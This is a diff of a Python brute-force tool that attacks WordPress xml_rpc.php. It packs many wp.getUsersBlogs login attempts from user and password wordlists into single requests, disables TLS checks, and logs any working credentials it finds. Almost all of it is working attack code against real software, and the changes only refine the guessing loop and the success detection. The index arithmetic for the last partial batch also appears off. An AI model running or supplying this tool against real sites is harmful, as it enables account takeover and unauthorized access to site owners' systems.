@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 import argparse
 import requests
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 from requests.adapters import HTTPAdapter, Retry
 
 def credits():
-    print(""" _    _               _                          ______            _        __                        
+    print("""\n_    _               _                          ______            _        __                        
             | |  | |             | |                         | ___ \          | |      / _|                       
             | |  | | ___  _ __ __| |_ __  _ __ ___  ___ ___  | |_/ /_ __ _   _| |_ ___| |_ ___  _ __ ___ ___ _ __ 
             | |/\| |/ _ \| '__/ _` | '_ \| '__/ _ \/ __/ __| | ___ \ '__| | | | __/ _ \  _/ _ \| '__/ __/ _ \ '__|
@@ -30,20 +31,32 @@ def credits():
                                                                                                                   
                                                                                                       """)
 
+
+def valid_credentials(response):
+    credentials_found = True
+    general_error = "error"
+    #error_message_arab = u"اسم المستخدم أو كلمة المرور غير صحيحين"
+    error_message_en = "Incorrect"
+    error_message_es = "Incorrecto"
+    error_messages = (general_error, error_message_en, error_message_es)
+    for error in error_messages:
+        if error in response:
+            credentials_found = False
+    return credentials_found
+
+
 def check_response(response, credentials_file):
     pwned = False
     password_index = -1
-    error_message_en = "Incorrect"
-    error_message_es = "Incorrecto"
     messages_counter = 0
     # Last position is methodResponse, no password data
     responses_to_check = response.text.split("</struct>")[:-1]
     while messages_counter < len(responses_to_check) and not pwned:
         individual_response = responses_to_check[messages_counter]
-        if not error_message_en in individual_response and not error_message_es in individual_response:
+        if valid_credentials(individual_response):
             print("\n###\nResponse:\tPotential valid credentials found!\n##\n")
-            print("\tResponse: %s\n##\n" % (individual_response))
-            credentials_file.write(("Response:\n%s\n") % (responses_to_check[messages_counter]))
+            print("\tResponse: %s\n##\n" % individual_response)
+            credentials_file.write("Response:\n%s\n" % responses_to_check[messages_counter])
             pwned = True
             password_index = messages_counter
         messages_counter += 1
@@ -65,15 +78,15 @@ def bruteforce(target, wordlist_passwords, wordlist_users):
     all_passwords_processed = False
     users = open(wordlist_users, "r")
     for org_user in users:
-        while not credentials_found and not all_passwords_processed:
-            user = str(org_user).rstrip()
-            print("[-]Testing user %s" % user)
-            main_payload = ""
-            credentials_counter = 0
-            tested_credentials = []
-            passwords = open(wordlist_passwords, "r")
-            for org_password in passwords:
-                password = str(org_password).rstrip()
+        user = str(org_user).rstrip()
+        print("[-]Testing user %s" % user)
+        main_payload = ""
+        credentials_counter = 0
+        tested_credentials = []
+        passwords = open(wordlist_passwords, "r")
+        while not credentials_found:
+            password = passwords.readline().rstrip()
+            if password:
                 current_credentials = (user, password)
                 main_payload += """<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>
                                         params</name><value><array><data><value><array><data><value><string>%s</string></value><value><string>%s</string></value></data>
@@ -82,33 +95,33 @@ def bruteforce(target, wordlist_passwords, wordlist_users):
                 tested_credentials.append(current_credentials)
                 credentials_counter += 1
                 if credentials_counter % CREDENTIALS_PER_REQUEST == 0:
-                    print("[-] Testing %s credentials in request - %s total tried" % (CREDENTIALS_PER_REQUEST, credentials_counter))
+                    print("[-] Testing up to %s credentials in request - %s total tried" % (CREDENTIALS_PER_REQUEST, credentials_counter))
                     payload = PAYLOAD_STARTING + main_payload + PAYLOAD_END
                     request = session.post(url, data=payload, verify=False)
                     main_payload = ""
                     cred_index = check_response(request, RESULTS_FILE)
                     if cred_index > -1:
                         credentials_found = True
-                        print("\t\tCredentials: %s" % ("-".join(tested_credentials[cred_index])))
+                        print("\t\tCredentials: %s" % ("-".join(tested_credentials[credentials_counter - CREDENTIALS_PER_REQUEST + cred_index])))
                         RESULTS_FILE.write(
-                            "\t########\n\t\tCredentials: %s\n" % ("-".join(tested_credentials[cred_index])))
+                            "\t########\n\t\tCredentials: %s\n" % ("-".join(tested_credentials[credentials_counter - CREDENTIALS_PER_REQUEST + cred_index])))
                     else:
                         print("\tNo credentials found in response")
-
-            # Check remaining credentials before trying another user
-            if main_payload != "":
-                print("[-] Testing %s credentials in request - %s total tried" % (CREDENTIALS_PER_REQUEST, credentials_counter))
-                payload = PAYLOAD_STARTING + main_payload + PAYLOAD_END
-                request = session.post(url, data=payload, verify=False)
-                cred_index = check_response(request, RESULTS_FILE)
-                if cred_index > -1:
-                    print("\t\tCredentials: %s" % ("-".join(tested_credentials[cred_index])))
-                    RESULTS_FILE.write("\t########\n\t\tCredentials: %s\n" % ("-".join(tested_credentials[cred_index])))
-                else:
-                    print("No credentials found in response")
-            all_passwords_processed = True
+            else:
+                # Check remaining credentials before trying another user
+                if main_payload != "":
+                    print("[-] Testing up to %s credentials in request - %s total tried" % (CREDENTIALS_PER_REQUEST, credentials_counter))
+                    payload = PAYLOAD_STARTING + main_payload + PAYLOAD_END
+                    request = session.post(url, data=payload, verify=False)
+                    cred_index = check_response(request, RESULTS_FILE)
+                    if cred_index > -1:
+                        print("\t\tCredentials: %s" % ("-".join(tested_credentials[credentials_counter - CREDENTIALS_PER_REQUEST + cred_index])))
+                        RESULTS_FILE.write("\t########\n\t\tCredentials: %s\n" % ("-".join(tested_credentials[credentials_counter - CREDENTIALS_PER_REQUEST + cred_index])))
+                    else:
+                        print("No credentials found in response")
 
     RESULTS_FILE.close()
+
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Wordpress xml_rpc.php bruteforcer")
